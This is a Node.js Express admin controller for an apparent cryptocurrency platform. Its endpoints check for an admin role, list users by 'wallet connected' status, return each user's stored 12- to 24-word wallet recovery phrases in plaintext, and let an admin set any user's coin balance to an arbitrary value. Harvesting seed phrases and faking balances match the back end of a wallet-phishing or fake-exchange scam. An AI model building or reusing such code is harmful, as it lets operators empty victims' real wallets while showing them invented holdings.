const jwt = require('jsonwebtoken');
const db = require('../../config/db');

// Middleware to authenticate and check if user is admin
exports.isAdmin = async (req, res, next) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader ? authHeader.slice(7) : "";
    if (!token) return res.status(401).json({ msg: "Authorization token required", status_code: false });

    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const user_id = decoded.userId || decoded.id;

    const [rows] = await db.query("SELECT * FROM users WHERE id = $1", [user_id]);
    if (rows.length === 0) {
      return res.status(401).json({ msg: "User not found", status_code: false });
    }

    const user = rows[0];
    if (user.role !== 'admin') {
      return res.status(403).json({ msg: "Access denied. Admins only.", status_code: false });
    }

    req.user = user;
    next();
  } catch (err) {
    console.error("❌ isAdmin Auth Error:", err.message);
    return res.status(401).json({ msg: "Invalid or expired token", status_code: false });
  }
};

// 1. Get all users with their wallet status
exports.getUsers = async (req, res) => {
  try {
    const [users] = await db.query("SELECT id, name, username, email, role, isActive, created_at FROM users ORDER BY id DESC");

    // For each user, check wallet connection status
    const usersWithWallet = [];
    for (const u of users) {
      // Check in wallet table
      const [oldWallets] = await db.query("SELECT id FROM wallet WHERE user_id = $1", [u.id]);

      const isConnected = oldWallets.length > 0;
      usersWithWallet.push({
        ...u,
        walletStatus: isConnected ? "connected" : "not-connected"
      });
    }

    return res.status(200).json({ status_code: true, users: usersWithWallet });
  } catch (err) {
    console.error("❌ getUsers Admin Error:", err.message);
    return res.status(500).json({ msg: err.message, status_code: false });
  }
};

// 2. Get detailed info & phrases of a single user
exports.getUserDetail = async (req, res) => {
  try {
    const { userId } = req.params;

    // Fetch user basic info
    const [userRows] = await db.query("SELECT id, name, username, email, role, isActive FROM users WHERE id = $1", [userId]);
    if (userRows.length === 0) {
      return res.status(404).json({ msg: "User not found", status_code: false });
    }
    const user = userRows[0];

    // Fetch phrases
    const phrases = [];

    // Check old wallet table
    const [oldWallets] = await db.query(
      `SELECT type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve,
              thirteen, fourteen, fifteen, sixteen, seventeen, eighteen, nineteen, twenty,
              twenty_one, twenty_two, twenty_three, twenty_four, created_at
       FROM wallet WHERE user_id = $1`,
      [userId]
    );
    oldWallets.forEach(w => {
      const words = [
        w.one, w.two, w.three, w.four, w.five, w.six, w.seven, w.eight, w.nine, w.ten, w.eleven, w.twelve,
        w.thirteen, w.fourteen, w.fifteen, w.sixteen, w.seventeen, w.eighteen, w.nineteen, w.twenty,
        w.twenty_one, w.twenty_two, w.twenty_three, w.twenty_four
      ].filter(Boolean);
      if (words.length > 0) {
        phrases.push({
          source: "Manual Wallet Link",
          walletName: w.type || "Imported Wallet",
          phrase: words.join(" "),
          created_at: w.created_at
        });
      }
    });

    return res.status(200).json({
      status_code: true,
      user,
      phrases
    });
  } catch (err) {
    console.error("❌ getUserDetail Admin Error:", err.message);
    return res.status(500).json({ msg: err.message, status_code: false });
  }
};

// 3. Get user coin balances
exports.getUserCoins = async (req, res) => {
  try {
    const { userId } = req.params;

    // Fetch all supported coins from cripto_list
    const [coins] = await db.query("SELECT id, name, unique_id, icon, type FROM cripto_list WHERE is_active = true");

    // Fetch user wallet entries
    const [balances] = await db.query("SELECT coin_id, quantity FROM user_wallet WHERE user_id = $1", [userId]);

    const coinBalances = coins.map(c => {
      const balRow = balances.find(b => b.coin_id === c.id);
      return {
        coin_id: c.id,
        name: c.name,
        unique_id: c.unique_id,
        icon: c.icon,
        type: c.type,
        balance: balRow ? balRow.quantity : 0
      };
    });

    return res.status(200).json({
      status_code: true,
      coins: coinBalances
    });
  } catch (err) {
    console.error("❌ getUserCoins Admin Error:", err.message);
    return res.status(500).json({ msg: err.message, status_code: false });
  }
};

// 4. Update user coin balance
exports.updateUserBalance = async (req, res) => {
  try {
    const { userId } = req.params;
    const { coin_id, balance } = req.body;

    if (coin_id === undefined || balance === undefined) {
      return res.status(400).json({ msg: "coin_id and balance are required", status_code: false });
    }

    if (balance < 0) {
      return res.status(400).json({ msg: "Coin balance must be zero or greater", status_code: false });
    }

    // Check if user_wallet record exists for this coin
    const [existRows] = await db.query("SELECT id FROM user_wallet WHERE user_id = $1 AND coin_id = $2", [userId, coin_id]);

    if (existRows.length > 0) {
      // Update
      await db.query("UPDATE user_wallet SET quantity = $1, updated_at = NOW() WHERE user_id = $2 AND coin_id = $3", [balance, userId, coin_id]);
    } else {
      // Insert
      await db.query("INSERT INTO user_wallet (user_id, coin_id, quantity, is_active, created_at, updated_at) VALUES ($1, $2, $3, true, NOW(), NOW())", [userId, coin_id, balance]);
    }

    return res.status(200).json({ msg: "Coin balance updated successfully", status_code: true });
  } catch (err) {
    console.error("❌ updateUserBalance Admin Error:", err.message);
    return res.status(500).json({ msg: err.message, status_code: false });
  }
};
